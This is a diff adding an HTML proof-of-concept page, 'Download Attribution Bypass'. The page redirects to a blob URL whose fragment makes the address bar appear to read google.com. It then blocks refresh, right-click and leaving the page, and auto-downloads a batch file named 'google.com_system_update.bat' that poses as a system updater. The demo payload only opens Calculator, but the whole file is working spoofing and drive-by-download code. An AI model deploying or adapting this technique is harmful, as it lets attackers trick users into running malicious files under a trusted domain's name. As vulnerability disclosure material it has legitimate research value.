@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC: Download Attribution Bypass</title>
+<style>
+  body { margin:0; height:100vh; background:#0a0a0a; color:#fff; font-family:system-ui, -apple-system, sans-serif; display:flex; justify-content:center; align-items:center; text-align:center; }
+  h1 { font-size:1.2rem; font-weight:500; opacity:0.8; }
+</style>
+</head>
+<body>
+
+  <h1>Redirecting to <code>blob:null</code>...</h1>
+
+  <script>
+    (function () {
+      const batLines = [
+        '@echo off',
+        'title Trusted Domain System Updater',
+        'echo Initializing secure update sequence...',
+        'timeout /t 2 >nul',
+        'echo Verifying system integrity...',
+        'start "" "C:\\\\Windows\\\\System32\\\\calc.exe"',
+        'echo Update applied successfully.',
+        'pause'
+      ];
+
+      const innerHTML = `<!DOCTYPE html>
+        <html><head><meta charset="utf-8"><title>google.com</title></head>
+        <body style="margin:0;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#0a0a0a;color:#fff;font-family:system-ui,-apple-system,sans-serif;gap:24px;">
+          <h1 style="margin:0;font-size:2rem;font-weight:500;color:#fff;">pwned by abhirdd</h1>
+          <img src="https://cataas.com/cat?width=400&height=300&t=${Date.now()}" alt="cute cat"
+               style="max-width:400px;width:80vw;border-radius:12px;"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='block';">
+          <div style="display:none;font-size:6rem;">🐱</div>
+          
+          <p style="font-size:0.8rem;color:#666;margin-top:20px;user-select:none;">
+            (Anti-Refresh Shield Active. Tekan F5/Ctrl+R untuk menguji)
+          </p>
+
+          <script>
+            // =====================================================================
+            // PERISAI ANTI-REFRESH (MENCEGAH ERROR ERR_FILE_NOT_FOUND)
+            // =====================================================================
+            
+            // 1. Blokir tombol F5 dan Ctrl+R secara total
+            window.addEventListener('keydown', function (e) {
+              const isReload = e.key === 'F5' || ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'r');
+              if (isReload) {
+                e.preventDefault();
+                e.stopPropagation();
+                document.body.style.backgroundColor = '#3a0000'; // Kedip merah sebagai tanda ditolak
+                setTimeout(() => document.body.style.backgroundColor = '#0a0a0a', 150);
+                return false;
+              }
+            }, true);
+
+            // 2. Blokir klik kanan (mencegah reload dari menu klik kanan)
+            window.addEventListener('contextmenu', function (e) {
+              e.preventDefault();
+            });
+
+            // 3. Blokir tombol Reload di browser (Ikon melingkar)
+            // Memunculkan dialog "Leave Site?" -> Jika user klik Cancel, URL tetap aman.
+            window.addEventListener('beforeunload', function (e) {
+              e.preventDefault();
+              e.returnValue = 'URL blob:null akan error jika di-refresh!';
+              return e.returnValue;
+            });
+
+            // =====================================================================
+            // TRIGGER DOWNLOAD .bat
+            // =====================================================================
+            const batLines = ${JSON.stringify(batLines)};
+            const batBlob = new Blob([batLines.join('\\r\\n')], { type: 'application/octet-stream' });
+            const batUrl = URL.createObjectURL(batBlob);
+            const a = document.createElement('a');
+            a.href = batUrl;
+            a.download = 'google.com_system_update.bat';
+            document.body.appendChild(a);
+            a.click();
+          <\/script>
+        </body></html>`;
+
+      const htmlBlob = new Blob([innerHTML], { type: 'text/html' });
+      const htmlUrl  = URL.createObjectURL(htmlBlob);
+
+      // LANGSUNG REDIRECT TANPA POPUP / TOMBOL
+      // URL bar akan langsung berubah menjadi blob:null/<uuid>#%EF%BC%8Fgoogle.com
+      location.replace(htmlUrl + '#%EF%BC%8Fgoogle.com');
+    })();
+  </script>
+
+</body>
+</html>
